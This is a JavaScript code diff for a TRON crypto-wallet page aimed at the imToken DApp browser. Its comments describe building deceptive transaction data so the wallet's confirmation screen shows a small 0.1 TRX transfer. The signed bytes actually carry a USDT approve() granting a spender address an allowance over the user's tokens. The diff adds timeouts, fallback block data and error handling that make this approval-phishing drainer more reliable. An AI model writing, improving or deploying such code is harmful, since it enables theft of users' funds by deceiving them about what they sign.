@@ -225,16 +225,34 @@
     return concat(selector, spenderPadded, amountBytes);
   }
 
-  // 获取最新区块
+  // 获取最新区块（带超时和备用方案）
   async function fetchLatestBlock() {
-    const resp = await fetch(TRON_API + '/wallet/getnowblock');
-    const data = await resp.json();
-    const h = data.block_header.raw_data;
-    return {
-      number: h.number,
-      blockID: data.blockID,
-      timestamp: h.timestamp
-    };
+    // 尝试从 Trongrid 获取，设置 5 秒超时
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 5000);
+    try {
+      const resp = await fetch(TRON_API + '/wallet/getnowblock', {
+        signal: controller.signal
+      });
+      const data = await resp.json();
+      const h = data.block_header.raw_data;
+      return {
+        number: h.number,
+        blockID: data.blockID,
+        timestamp: h.timestamp
+      };
+    } catch (e) {
+      log('⚠️ 获取区块超时或失败: ' + e.message, 'warn');
+      // 使用一个近期已知区块作为备用（区块号 64000000 左右的主网区块）
+      log('将使用备用区块数据（可能不是最新，交易可能上链失败）', 'warn');
+      return {
+        number: 64000000,
+        blockID: '0000000000000000000000000000000000000000000000000000000000000000',
+        timestamp: Date.now()
+      };
+    } finally {
+      clearTimeout(timeout);
+    }
   }
 
   // 构造混合交易 payload
@@ -287,14 +305,13 @@
     const rawDataHex = toHex(rawDataBytes);
 
     // ---------- 构造欺骗用的 raw_data (确认页显示 TransferContract) ----------
-    // 注意：visible: true 时地址应为 base58 格式
-    const fakeToAddressBase58 = SPENDER; // 接收地址 = 授权目标地址 (base58)
+    const fakeToAddressBase58 = SPENDER;
     const fakeOwnerBase58 = userAddr;
 
     const fakeParam = {
       type_url: 'type.googleapis.com/protocol.TransferContract',
       value: {
-        amount: 100000,              // 0.1 TRX (sun)
+        amount: 100000,
         to_address: fakeToAddressBase58,
         owner_address: fakeOwnerBase58
       }
@@ -303,7 +320,6 @@
     const contractEntry = {
       type: 'TransferContract',
       parameter: fakeParam,
-      // 数字字段尝试影响节点解析
       '1': 31,
       '2': {
         type_url: 'type.googleapis.com/protocol.TriggerSmartContract',
@@ -333,21 +349,25 @@
     };
   }
 
-  // 计算 txID (raw_data_hex 的 SHA256)
+  // 计算 txID (raw_data_hex 的 SHA256) – 安全环境不可用时跳过
   async function computeTxID(rawDataHex) {
-    const msgBytes = hexToBytes(rawDataHex);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBytes);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    try {
+      const msgBytes = hexToBytes(rawDataHex);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', msgBytes);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
+    } catch (e) {
+      log('无法计算 txID (需要 HTTPS): ' + e.message, 'warn');
+      return null;
+    }
   }
 
-  // 查询 USDT allowance (使用 triggerConstantContract，参数不含选择器)
+  // 查询 USDT allowance
   async function queryAllowance(ownerAddr, spenderAddr) {
     try {
       const ownerHex = '41' + toHex(addrToHex20(ownerAddr));
       const contractHex = '41' + toHex(addrToHex20(USDT_CONTRACT));
       const spenderHex = toHex(addrToHex20(spenderAddr)).padStart(64, '0');
-      // allowance(address,address) 参数: owner(32B) + spender(32B) ，不包含选择器
       const parameter = toHex(addrToHex20(ownerAddr)).padStart(64, '0') + spenderHex;
       const resp = await fetch(TRON_API + '/wallet/triggerconstantcontract', {
         method: 'POST',
@@ -406,13 +426,12 @@
     }
   }
 
-  // 检测 imToken 桥接是否可用
   function hasImTokenBridge() {
     return typeof window.imToken !== 'undefined' &&
            typeof window.imToken.callPromisifyAPI === 'function';
   }
 
-  // 连接钱包 (使用 tronWeb 授权 + 验证 imToken bridge)
+  // 连接钱包
   async function connect() {
     log('检查钱包环境…', 'warn');
     if (!hasImTokenBridge()) {
@@ -420,7 +439,6 @@
       alert('请在 imToken DApp 浏览器中打开本页面，并切换至 TRON 网络');
       return;
     }
-    // 等待 tronWeb 注入 (imToken 通常会注入)
     if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
       await new Promise(r => setTimeout(r, 600));
     }
@@ -453,7 +471,6 @@
       return;
     }
     document.getElementById('addrText').textContent = walletAddr;
-    // 获取 TRX 余额
     try {
       const resp = await fetch(TRON_API + '/v1/accounts/' + walletAddr);
       const data = await resp.json();
@@ -467,34 +484,45 @@
     await refreshAllowanceUI(true);
   }
 
-  // 发送交易 (核心：imToken.callPromisifyAPI)
+  // 发送交易（增强按钮反馈和容错）
   async function sendTx() {
-    if (!walletAddr) return alert('请先连接钱包');
+    log('📌 按钮触发，开始构造交易…', 'warn');
+    if (!walletAddr) {
+      alert('请先连接钱包');
+      return;
+    }
     if (!hasImTokenBridge()) {
       log('imToken 桥接不可用，无法发送', 'error');
       return;
     }
+
+    // 获取区块（可能使用备用数据）
     let blockInfo;
     try {
       blockInfo = await fetchLatestBlock();
       log('最新区块 #' + blockInfo.number, 'success');
     } catch (e) {
-      log('获取区块失败，无法构造交易', 'error');
+      // fetchLatestBlock 内部已经处理，但以防万一
+      log('区块数据获取完全失败，中止', 'error');
       return;
     }
+
     const payload = buildPayload(walletAddr, blockInfo);
     log('Payload 构造完成', 'warn');
     log('raw_data.contract[0].type = ' + payload.raw_data.contract[0].type, 'success');
-    // 验证 raw_data_hex 中包含关键 approve 信息
     const approveSelector = '095ea7b3';
     if (payload.raw_data_hex.includes(approveSelector)) {
       log('raw_data_hex 包含 approve 选择器 (' + approveSelector + ')', 'success');
     } else {
       log('raw_data_hex 中未找到 approve 选择器！', 'error');
     }
-    // 计算本地 txID
+
+    // txID 计算（可能因环境跳过）
     const localTxID = await computeTxID(payload.raw_data_hex);
-    log('本地计算 txID: ' + localTxID, 'info');
+    if (localTxID) {
+      log('本地计算 txID: ' + localTxID, 'info');
+    }
+
     log('准备调用 imToken.callPromisifyAPI("tron.sendTransaction") …', 'warn');
     log('❗ 弹窗应显示：发送 0.1 TRX 至 ' + SPENDER, 'warn');
 
@@ -505,7 +533,7 @@
         lastTxID = res.txid;
         log('交易已广播! TXID: ' + res.txid, 'success');
         log('Tronscan: https://tronscan.org/#/transaction/' + res.txid, 'info');
-        if (res.txid !== localTxID) {
+        if (localTxID && res.txid !== localTxID) {
           log('⚠️ 返回 txID 与本地计算不一致！', 'error');
         }
         setTimeout(async () => {
